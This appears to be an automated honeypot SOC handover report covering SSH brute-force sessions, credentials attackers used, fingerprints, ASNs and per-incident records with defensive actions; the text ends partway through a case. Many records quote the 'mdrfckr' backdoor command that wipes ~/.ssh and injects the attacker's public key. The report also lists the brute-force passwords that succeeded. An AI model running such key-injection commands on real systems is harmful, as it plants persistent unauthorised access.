# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-12 |
| **Generated At** | 2026-04-12T10:37:14Z |
| **Shift Time** | 10:37 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **123** |
| Confirmed Threats | **122** |
| False Positives Filtered | **1** (0.8%) |
| Unique Attacker IPs | **20** |
| Countries of Origin | **10** |
| High Severity Cases | **38** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **85** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **88** |
| Unique Credential Pairs | **45** |
| Unique Usernames | **22** |
| Unique Passwords | **45** |
| Successful Auth Pairs | **29** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 38 |
| `345gs5662d34` | 19 |
| `ubuntu` | 7 |
| `bot` | 4 |
| `test` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 19 |
| `3245gs5662d34` | 19 |
| `Bot17` | 2 |
| `1234-zxcv` | 2 |
| `root2022!@#` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 19 |
| `root` | `3245gs5662d34` | 19 |
| `bot` | `Bot17` | 2 |
| `root` | `1234-zxcv` | 2 |
| `root` | `root2022!@#` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `1234-zxcv` | `103.13.206.100` | 2026-04-12T10:20:37 |
| `root` | `3245gs5662d34` | `103.13.206.100` | 2026-04-12T10:20:39 |
| `root` | `Ck123456@` | `180.184.82.249` | 2026-04-12T10:22:12 |
| `root` | `3245gs5662d34` | `180.184.82.249` | 2026-04-12T10:22:21 |
| `root` | `1234-zxcv` | `154.209.4.195` | 2026-04-12T10:23:54 |
| `root` | `3245gs5662d34` | `154.209.4.195` | 2026-04-12T10:23:58 |
| `root` | `root2022` | `49.231.192.36` | 2026-04-12T10:24:40 |
| `root` | `3245gs5662d34` | `49.231.192.36` | 2026-04-12T10:24:45 |
| `root` | `Ks123456@` | `101.47.159.125` | 2026-04-12T10:24:55 |
| `root` | `3245gs5662d34` | `101.47.159.125` | 2026-04-12T10:24:58 |
| `root` | `9ol.!@#` | `69.6.221.248` | 2026-04-12T10:25:54 |
| `root` | `3245gs5662d34` | `69.6.221.248` | 2026-04-12T10:26:02 |
| `root` | `root2022!@#` | `101.47.159.125` | 2026-04-12T10:26:41 |
| `root` | `root2022!@#` | `62.3.56.187` | 2026-04-12T10:28:27 |
| `root` | `3245gs5662d34` | `62.3.56.187` | 2026-04-12T10:28:32 |
| `root` | `!QAZ2wsx$` | `69.6.221.248` | 2026-04-12T10:29:29 |
| `root` | `Qazwsx8888#` | `101.47.159.125` | 2026-04-12T10:30:00 |
| `root` | `ZAQ!2wsx4321` | `118.193.34.157` | 2026-04-12T10:30:36 |
| `root` | `3245gs5662d34` | `118.193.34.157` | 2026-04-12T10:30:39 |
| `root` | `ZAQ!2wsx4321` | `209.141.41.212` | 2026-04-12T10:31:15 |
| `root` | `3245gs5662d34` | `209.141.41.212` | 2026-04-12T10:31:23 |
| `root` | `DDcc112233` | `209.141.41.212` | 2026-04-12T10:32:50 |
| `root` | `Qazwsx12345678` | `69.6.221.248` | 2026-04-12T10:33:04 |
| `root` | `Root111111!` | `128.1.38.169` | 2026-04-12T10:33:12 |
| `root` | `3245gs5662d34` | `128.1.38.169` | 2026-04-12T10:33:15 |
| `root` | `Abcd123456789#$` | `209.141.41.212` | 2026-04-12T10:34:15 |
| `root` | `Root2021!@#` | `69.6.221.248` | 2026-04-12T10:34:44 |
| `root` | `qazwsx12345@@` | `209.141.41.212` | 2026-04-12T10:35:00 |
| `root` | `Root001..` | `209.141.41.212` | 2026-04-12T10:35:46 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **123** |
| Sessions with Fingerprint | **2** |
| Unique HASSH Fingerprints | **2** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 91 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 91 | 14 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 91 | 14 | Modern SSH client |
| `95420f9d932d...` | Unknown | 1 | 1 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 19 | 10 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `128.1.38.169`, `209.141.41.212`, `101.47.159.125`, `62.3.56.187`, `69.6.221.248`, `180.184.82.249`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **20** |
| Unique ASNs | **17** |
| High-Risk ASNs | **16** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 2 | HIGH |
| `AS202425` | IP Volume inc | 1 | HIGH |
| `AS45458` | SBN-ISP/AWN-ISP and SBN-NIX/AWN-NIX | 1 | HIGH |
| `AS53667` | FranTech Solutions | 1 | HIGH |
| `AS210513` | Masarat Al-Iraq Information Technology Co., Ltd | 1 | HIGH |
| `AS150436` | Byteplus Pte. Ltd. | 1 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (38)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-672cd7f8facb

| Field | Detail |
|---|---|
| **Source IP** | `103.13.206[.]100` |
| **First Seen** | 2026-04-12 10:20 |
| **Last Seen** | 2026-04-12 10:20 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:20:36` | `cowrie.session.connect` |
| `2026-04-12 10:20:36` | `cowrie.client.version` |
| `2026-04-12 10:20:36` | `cowrie.client.kex` |
| `2026-04-12 10:20:37` | `cowrie.login.success` |
| `2026-04-12 10:20:37` | `cowrie.session.params` |
| `2026-04-12 10:20:37` | `cowrie.command.input` |
| `2026-04-12 10:20:37` | `cowrie.command.failed` |
| `2026-04-12 10:20:37` | `cowrie.log.closed` |
| `2026-04-12 10:20:37` | `cowrie.session.params` |
| `2026-04-12 10:20:37` | `cowrie.command.input` |
| `2026-04-12 10:20:37` | `cowrie.session.file_download` |
| `2026-04-12 10:20:37` | `cowrie.log.closed` |
| `2026-04-12 10:20:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.13.206[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.13.206[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c98c2ee9a631

| Field | Detail |
|---|---|
| **Source IP** | `103.13.206[.]100` |
| **First Seen** | 2026-04-12 10:20 |
| **Last Seen** | 2026-04-12 10:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:20:39` | `cowrie.session.connect` |
| `2026-04-12 10:20:39` | `cowrie.client.version` |
| `2026-04-12 10:20:39` | `cowrie.client.kex` |
| `2026-04-12 10:20:39` | `cowrie.login.success` |
| `2026-04-12 10:20:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.13.206[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.13.206[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33753bab03d6

| Field | Detail |
|---|---|
| **Source IP** | `180.184.82[.]249` |
| **First Seen** | 2026-04-12 10:22 |
| **Last Seen** | 2026-04-12 10:22 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:22:10` | `cowrie.session.connect` |
| `2026-04-12 10:22:10` | `cowrie.client.version` |
| `2026-04-12 10:22:10` | `cowrie.client.kex` |
| `2026-04-12 10:22:12` | `cowrie.login.success` |
| `2026-04-12 10:22:13` | `cowrie.session.params` |
| `2026-04-12 10:22:13` | `cowrie.command.input` |
| `2026-04-12 10:22:13` | `cowrie.command.failed` |
| `2026-04-12 10:22:17` | `cowrie.log.closed` |
| `2026-04-12 10:22:17` | `cowrie.session.params` |
| `2026-04-12 10:22:17` | `cowrie.command.input` |
| `2026-04-12 10:22:18` | `cowrie.session.file_download` |
| `2026-04-12 10:22:18` | `cowrie.log.closed` |
| `2026-04-12 10:22:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.184.82[.]249` to AbuseIPDB if not already reported
- [ ] Block `180.184.82[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0db57afbdcd6

| Field | Detail |
|---|---|
| **Source IP** | `180.184.82[.]249` |
| **First Seen** | 2026-04-12 10:22 |
| **Last Seen** | 2026-04-12 10:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:22:20` | `cowrie.session.connect` |
| `2026-04-12 10:22:20` | `cowrie.client.version` |
| `2026-04-12 10:22:20` | `cowrie.client.kex` |
| `2026-04-12 10:22:21` | `cowrie.login.success` |
| `2026-04-12 10:22:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.184.82[.]249` to AbuseIPDB if not already reported
- [ ] Block `180.184.82[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-938a41538bb3

| Field | Detail |
|---|---|
| **Source IP** | `154.209.4[.]195` |
| **First Seen** | 2026-04-12 10:23 |
| **Last Seen** | 2026-04-12 10:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:23:54` | `cowrie.session.connect` |
| `2026-04-12 10:23:54` | `cowrie.client.version` |
| `2026-04-12 10:23:54` | `cowrie.client.kex` |
| `2026-04-12 10:23:54` | `cowrie.login.success` |
| `2026-04-12 10:23:54` | `cowrie.session.params` |
| `2026-04-12 10:23:54` | `cowrie.command.input` |
| `2026-04-12 10:23:54` | `cowrie.command.failed` |
| `2026-04-12 10:23:54` | `cowrie.log.closed` |
| `2026-04-12 10:23:55` | `cowrie.session.params` |
| `2026-04-12 10:23:55` | `cowrie.command.input` |
| `2026-04-12 10:23:55` | `cowrie.session.file_download` |
| `2026-04-12 10:23:55` | `cowrie.log.closed` |
| `2026-04-12 10:23:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.209.4[.]195` to AbuseIPDB if not already reported
- [ ] Block `154.209.4[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a698e64dbfe0

| Field | Detail |
|---|---|
| **Source IP** | `154.209.4[.]195` |
| **First Seen** | 2026-04-12 10:23 |
| **Last Seen** | 2026-04-12 10:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:23:57` | `cowrie.session.connect` |
| `2026-04-12 10:23:57` | `cowrie.client.version` |
| `2026-04-12 10:23:57` | `cowrie.client.kex` |
| `2026-04-12 10:23:58` | `cowrie.login.success` |
| `2026-04-12 10:23:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.209.4[.]195` to AbuseIPDB if not already reported
- [ ] Block `154.209.4[.]195` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb3396004a16

| Field | Detail |
|---|---|
| **Source IP** | `49.231.192[.]36` |
| **First Seen** | 2026-04-12 10:24 |
| **Last Seen** | 2026-04-12 10:24 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:24:39` | `cowrie.session.connect` |
| `2026-04-12 10:24:39` | `cowrie.client.version` |
| `2026-04-12 10:24:39` | `cowrie.client.kex` |
| `2026-04-12 10:24:40` | `cowrie.login.success` |
| `2026-04-12 10:24:40` | `cowrie.session.params` |
| `2026-04-12 10:24:40` | `cowrie.command.input` |
| `2026-04-12 10:24:40` | `cowrie.command.failed` |
| `2026-04-12 10:24:40` | `cowrie.log.closed` |
| `2026-04-12 10:24:41` | `cowrie.session.params` |
| `2026-04-12 10:24:41` | `cowrie.command.input` |
| `2026-04-12 10:24:41` | `cowrie.session.file_download` |
| `2026-04-12 10:24:41` | `cowrie.log.closed` |
| `2026-04-12 10:24:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.231.192[.]36` to AbuseIPDB if not already reported
- [ ] Block `49.231.192[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ed02c7fa7a3

| Field | Detail |
|---|---|
| **Source IP** | `49.231.192[.]36` |
| **First Seen** | 2026-04-12 10:24 |
| **Last Seen** | 2026-04-12 10:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:24:44` | `cowrie.session.connect` |
| `2026-04-12 10:24:44` | `cowrie.client.version` |
| `2026-04-12 10:24:44` | `cowrie.client.kex` |
| `2026-04-12 10:24:45` | `cowrie.login.success` |
| `2026-04-12 10:24:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.231.192[.]36` to AbuseIPDB if not already reported
- [ ] Block `49.231.192[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-894a1493abda

| Field | Detail |
|---|---|
| **Source IP** | `101.47.159[.]125` |
| **First Seen** | 2026-04-12 10:24 |
| **Last Seen** | 2026-04-12 10:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:24:54` | `cowrie.session.connect` |
| `2026-04-12 10:24:54` | `cowrie.client.version` |
| `2026-04-12 10:24:54` | `cowrie.client.kex` |
| `2026-04-12 10:24:55` | `cowrie.login.success` |
| `2026-04-12 10:24:55` | `cowrie.session.params` |
| `2026-04-12 10:24:55` | `cowrie.command.input` |
| `2026-04-12 10:24:55` | `cowrie.command.failed` |
| `2026-04-12 10:24:55` | `cowrie.log.closed` |
| `2026-04-12 10:24:55` | `cowrie.session.params` |
| `2026-04-12 10:24:55` | `cowrie.command.input` |
| `2026-04-12 10:24:56` | `cowrie.session.file_download` |
| `2026-04-12 10:24:56` | `cowrie.log.closed` |
| `2026-04-12 10:24:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.159[.]125` to AbuseIPDB if not already reported
- [ ] Block `101.47.159[.]125` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ef11ffeb083

| Field | Detail |
|---|---|
| **Source IP** | `101.47.159[.]125` |
| **First Seen** | 2026-04-12 10:24 |
| **Last Seen** | 2026-04-12 10:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:24:58` | `cowrie.session.connect` |
| `2026-04-12 10:24:58` | `cowrie.client.version` |
| `2026-04-12 10:24:58` | `cowrie.client.kex` |
| `2026-04-12 10:24:58` | `cowrie.login.success` |
| `2026-04-12 10:24:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.159[.]125` to AbuseIPDB if not already reported
- [ ] Block `101.47.159[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cec5f766411a

| Field | Detail |
|---|---|
| **Source IP** | `69.6.221[.]248` |
| **First Seen** | 2026-04-12 10:25 |
| **Last Seen** | 2026-04-12 10:26 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:25:52` | `cowrie.session.connect` |
| `2026-04-12 10:25:52` | `cowrie.client.version` |
| `2026-04-12 10:25:53` | `cowrie.client.kex` |
| `2026-04-12 10:25:54` | `cowrie.login.success` |
| `2026-04-12 10:25:55` | `cowrie.session.params` |
| `2026-04-12 10:25:55` | `cowrie.command.input` |
| `2026-04-12 10:25:55` | `cowrie.command.failed` |
| `2026-04-12 10:25:55` | `cowrie.log.closed` |
| `2026-04-12 10:25:56` | `cowrie.session.params` |
| `2026-04-12 10:25:56` | `cowrie.command.input` |
| `2026-04-12 10:25:56` | `cowrie.session.file_download` |
| `2026-04-12 10:25:56` | `cowrie.log.closed` |
| `2026-04-12 10:26:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.6.221[.]248` to AbuseIPDB if not already reported
- [ ] Block `69.6.221[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be577a1efeb3

| Field | Detail |
|---|---|
| **Source IP** | `69.6.221[.]248` |
| **First Seen** | 2026-04-12 10:26 |
| **Last Seen** | 2026-04-12 10:26 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 10:26:00` | `cowrie.session.connect` |
| `2026-04-12 10:26:00` | `cowrie.client.version` |
| `2026-04-12 10:26:00` | `cowrie.client.kex` |
| `2026-04-12 10:26:02` | `cowrie.login.success` |
| `2026-04-12 10:26:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.6.221[.]248` to AbuseIPDB if not already reported
- [ ] Block `69.6.221[.]248` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-056c25254f07

| Field | Detail |
|---|---|
| **Source IP** | `101.47.159[.]125` |
| **First Seen** | 2026-04-12 10:26 |
| **Last Seen** | 2026-04-12 10:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
